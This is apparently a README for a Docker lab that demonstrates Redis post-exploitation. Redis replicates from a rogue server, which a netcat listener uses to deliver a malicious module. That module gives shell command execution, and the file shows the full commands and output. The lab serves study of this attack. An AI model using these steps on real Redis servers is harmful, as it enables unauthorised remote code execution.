# redis-post-exploitation

For educational purposes only

## Reference
- https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf
- https://paper.seebug.org/975/
- https://github.com/rapid7/metasploit-framework/blob/a2675c13e88dc1df9e6cfed9021b2a5d4f82d231/modules/exploits/linux/redis/redis_replication_cmd_exec.rb#L67
- https://github.com/rapid7/metasploit-framework/tree/a2675c13e88dc1df9e6cfed9021b2a5d4f82d231/data/exploits/redis/exp

## Rogue Server
- https://github.com/knqyf263/redis-rogue-server

## Build

```
$ docker-compose build
```

## Run

```
$ docker-compose up -d
$ docker-compose exec rogue sh
```

```
/rogue/redis-rogue-server # redis-cli replicaof rogue 6379 
/rogue/redis-rogue-server # ( echo "+PONG"; echo "+OK"; echo "+OK"; echo "OK"; echo "\$42192"; cat exp.so ; ) | nc -lk -p 10000
```

## Check

```
/rogue/redis-rogue-server # redis-cli
127.0.0.1:6379> MODULE LOAD ./dump.rdb
OK
127.0.0.1:6379> shell.exec "whoami"
"redis\n"
```

